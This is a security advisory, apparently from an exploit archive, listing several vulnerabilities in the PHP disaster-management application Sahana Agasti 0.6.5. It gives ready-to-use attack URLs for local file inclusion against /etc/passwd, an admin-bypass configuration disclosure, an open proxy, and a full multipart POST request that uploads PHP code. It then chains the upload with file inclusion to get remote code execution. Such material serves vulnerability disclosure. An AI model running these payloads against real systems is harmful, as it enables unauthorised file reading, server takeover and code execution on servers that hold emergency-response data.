@@ -1,0 +1,252 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+ 
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ dun / 2011-01-07 ]
+ #############################################################
+ #  [ Sahana Agasti <= 0.6.5 ]  Multiple Vulnerabilities     #
+ #############################################################
+ #
+ # Script: "Agasti is the PHP based project of the Sahana Software Foundation. 
+ #          Based a long-term preparedness for disaster management..."
+ #
+ # Script site: http://www.sahanafoundation.org/
+ # Download: https://launchpad.net/sahana-agasti/
+ #
+
+ [LFI] Vuln: ( Scenario 1)
+ http://site.com/sahana-0.6.5/www/stream.php?stream_type=/../../../../../../../../../etc/passwd%00
+ File: ./sahana-0.6.5/www/stream.php
+
+    20	$global['approot'] = realpath(dirname(__FILE__)).'/../';
+    21	// $global['approot'] = '/usr/local/bin/sahana/';
+    22	$global['previous']=false;
+	...(CUT)...
+    39	    if(!$global['previous']){
+    40	        $global['action'] = (NULL == $_REQUEST['act']) ? 
+    41	                                "default" : $_REQUEST['act'];
+    42	        $global['module'] = (NULL == $_REQUEST['mod']) ? 
+    43	                                "home" : $_REQUEST['mod'];
+    44	    }
+    45	    $global['stream_type'] = $_GET['stream_type'];                                                    // [1]
+	...(CUT)...
+    52	    shn_front_controller();
+	...(CUT)...	
+    64	function shn_front_controller() 
+    65	{
+    66	    global $global;
+    67	    global $conf;
+    68	    $approot = $global['approot'];
+    69	    $action = $global['action'];
+    70	    $module = $global['module'];	
+	...(CUT)...		
+    90	    if($global['stream_type'] && file_exists($approot.'/inc/lib_st_'.$global['stream_type'].'.inc') ){// [2]
+    91	        require_once ($approot.'/inc/lib_st_'.$global['stream_type'].'.inc');                         // [3] LFI
+    92	        if(file_exists($approot.'/mod/'.$module.'/'.$global['stream_type'].'.inc'))
+    93	            $default_file = $approot.'/mod/'.$module.'/'.$global['stream_type'].'.inc';
+    94	        else
+    95	            $default_file = 'stream.inc';
+    96	    }	
+	
+
+ In this scenario script try to include something like this:
+ /var/www/apache/sahana/www/..//inc/lib_st_/../../../../../../../../../etc/passwd\0.inc
+
+ ################################################################################################################################
+
+ [LFI] Vuln: ( Scenario 2)
+ http://site.com/sahana-0.6.5/www/stream.php?mod=/../../../../../../../../../etc/passwd%00
+ File: ./sahana-0.6.5/www/stream.php
+    42	        $global['module'] = (NULL == $_REQUEST['mod']) ? 
+    43	                                "home" : $_REQUEST['mod'];
+	...(CUT)...		
+    70	    $module = $global['module'];	
+   	...(CUT)...		
+	90	    if($global['stream_type'] && file_exists($approot.'/inc/lib_st_'.$global['stream_type'].'.inc') ){
+    91	        require_once ($approot.'/inc/lib_st_'.$global['stream_type'].'.inc');
+    92	        if(file_exists($approot.'/mod/'.$module.'/'.$global['stream_type'].'.inc'))
+    93	            $default_file = $approot.'/mod/'.$module.'/'.$global['stream_type'].'.inc';
+    94	        else
+    95	            $default_file = 'stream.inc';
+    96	    }else
+    97	        $default_file = 'main.inc';                                                                   // [1]
+    98	
+    99	    // include the correct module file based on action and module
+   100	    $module_file = $approot.'mod/'.$module.'/'.$default_file;                                         // [2]
+   101	    if (! file_exists($module_file)) {                                                                //
+   102	        $module_file = $approot.'mod/home/'.$default_file;
+   103	    }
+	...(CUT)...		
+   109	    //Include the module file
+   110	    include($module_file);                                                                            // [3] LFI
+
+ In this scenario script try to include something like this:
+ /var/www/apache/sahana/www/../mod//../../../../../../../../../etc/passwd\0/main.inc
+
+ ################################################################################################################################
+
+ [LFI] Vuln: ( Scenario 3 without file_exists)
+ http://site.com/sahana-0.6.5/www/stream.php?act=adm&mod=/../../../../../../../../../etc/passwd%00
+ File: ./sahana-0.6.5/www/stream.php
+
+    42	        $global['module'] = (NULL == $_REQUEST['mod']) ?                                              // [1]
+    43	                                "home" : $_REQUEST['mod'];
+	...(CUT)...		
+    84	    if (preg_match('/^adm/',$action)) {                                                               //
+    85	        $module = 'admin';                                                                            // [2]
+    86	        $action = 'modadmin';                                                                         //
+    87	    }
+	...(CUT)...		
+    96	    }else
+    97	        $default_file = 'main.inc';                                                                   // [3]
+    98	
+    99	    // include the correct module file based on action and module
+   100	    $module_file = $approot.'mod/'.$module.'/'.$default_file;              // [4] ( /var/www/apache/sahana/www/../mod/admin/main.inc )
+	...(CUT)...	
+   110	    include($module_file);                                                                            // [5]
+	...(CUT)...	   
+   125	        $module_function = 'shn_'.$module.'_'.$action;                                                // [6] 
+   126	        if (!function_exists($module_function)) {                                                     //
+   127	            $module_function='shn_'.$module.'_default';
+   128	        }
+   129	        $_SESSION['last_module']=$module;
+   130	        $_SESSION['last_action']=$action;
+   131	        $output = $module_function();                                      // [7]  ( shn_admin_modadmin() ) 
+
+ File: ./sahana-0.6.5/mod/admin/main.inc
+
+   161	function shn_admin_modadmin()
+   162	{
+   163		global $global;
+   164	
+   165		// include original module admin section
+   166		include $global['approot']."/mod/".$global['module']."/admin.inc";                            // [8] LFI
+
+ In this scenario script try to include something like this:
+ /var/www/apache/sahana/www/..//mod//../../../../../../../../../etc/passwd\0/admin.inc
+
+ ################################################################################################################################
+
+ [Configuration disclosure] Vuln:
+ http://site.com/sahana-0.6.5/www/stream.php?mod=admin&act=conf_list
+ File: ./sahana-0.6.5/www/stream.php
+
+   100	    $module_file = $approot.'mod/'.$module.'/'.$default_file;              // [1] ( /var/www/apache/sahana/www/../mod/admin/main.inc )                    
+	...(CUT)...	   
+   110	    include($module_file);                                                 // [2]
+	...(CUT)...	    
+   125	        $module_function = 'shn_'.$module.'_'.$action;                     // [3]
+   126	        if (!function_exists($module_function)) {
+   127	            $module_function='shn_'.$module.'_default';
+   128	        }
+   129	        $_SESSION['last_module']=$module;
+   130	        $_SESSION['last_action']=$action;
+   131	        $output = $module_function();                                      // [4] ( shn_admin_conf_list()  )
+   
+ File: ./sahana-0.6.5/mod/admin/main.inc  
+    31	include_once $global['approot']."mod/admin/conf_admin.inc";                // [5]
+	
+ File: ./sahana-0.6.5/mod/admin/conf_admin.inc
+    22	function shn_admin_conf_list()                                             // [6] Configuration disclosure
+	...(CUT)...	   
+   
+ We can prepare function name, with using GET variables (mod, act)
+ We can use prepared functions with "shn_" prefix, with bypassing admin privileges
+ So lets see what next..
+
+ ################################################################################################################################
+
+ [Arbitrary File Upload] Vuln:
+ http://site.com/sahana-0.6.5/www/stream.php?mod=admin&act=lc_file_browser
+ File: ./sahana-0.6.5/www/stream.php
+
+   131	        $output = $module_function();                                      // [1] ( shn_admin_lc_file_browser()       
+
+ File: ./sahana-0.6.5/mod/admin/main.inc  
+
+   683	function shn_admin_lc_file_browser()                                       // [2] Arbitrary File Upload
+   684	{
+   685		global $global;
+   686		$locale = $_POST['locale'];
+   687		//$file_type=$_POST['file_type'];
+   688		$uploaddir = "../res/locale/$locale/LC_MESSAGES/";
+   689		//"../res/locale/$locale/LC_MESSAGES/";
+   690		//echo $uploaddir;
+   691		$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+   692	
+   693		if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+   694			add_confirmation('File uploaded sucessfully');
+   695		}else {
+   696			add_error('File uploaded failed');
+   697		}
+   698	
+   699	}
+
+ We can upload some file to /res/locale/$locale/LC_MESSAGES/ (default $locale is my_MM),
+ with using prepared POST
+ Example:
+
+ POST /sahana-0.6.5/www/stream.php?mod=admin&act=lc_file_browser HTTP/1.1
+ Host: site.com
+ User-Agent: Mozilla/5.0 Gecko/20101203 Firefox/3.6.13
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ Accept-Encoding: gzip,deflate
+ Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
+ Keep-Alive: 115
+ Connection: keep-alive
+ Content-Type: multipart/form-data; boundary=---------------------------11682257938924
+ Content-Length: 420
+ -----------------------------11682257938924
+ Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+ 50000
+ -----------------------------11682257938924
+ Content-Disposition: form-data; name="userfile"; filename="file.txt"
+ Content-Type: text/plain 
+
+ <?php phpinfo(); ?>
+ -----------------------------11682257938924
+ Content-Disposition: form-data; name="locale"
+ 
+ my_MM
+ -----------------------------11682257938924-- 
+
+ File /res/locale/my_MM/LC_MESSAGES/file.txt is created
+ We can use main.inc filename instead of file.txt
+ So let's go back to LFI ( scenario 1,2 ):
+ ( scenario 1 ) http://site.com/sahana-0.6.5/www/stream.php?stream_type=/../../res/locale/my_MM/LC_MESSAGES/main
+ ( scenario 2 ) http://site.com/sahana-0.6.5/www/stream.php?mod=/..//res/locale/my_MM/LC_MESSAGES/ 
+ It includes LC_MESSAGES/main.inc with our <?php phpinfo(); ?> (AFU+LFI=RCE)
+
+ ################################################################################################################################
+
+ [PHP Proxy]
+ http://site.com/sahana-0.6.5/www/res/lib_proxy.php?url=http://site2.com/dupa.php
+ File: ./sahana-0.6.5/www/res/lib_proxy.php
+
+    17  $url = $_GET['url'];
+    18  $parseurl = urldecode($url);
+    19
+    20  // open cURL session
+    21  $ch = curl_init();
+    22  curl_setopt($ch, CURLOPT_POST,1);
+    23  curl_setopt($ch, CURLOPT_URL,$parseurl);
+    24  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,  2);
+    25  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    26  curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+    27
+    28  $xml = curl_exec($ch);
+    29  curl_close($ch);
+    30
+    31  header("Content-Type: text/xml");
+    32
+    33  echo $xml;
+
+ ################################################################################################################################
+ And possible other bugs...
+ ################################################################################################################################
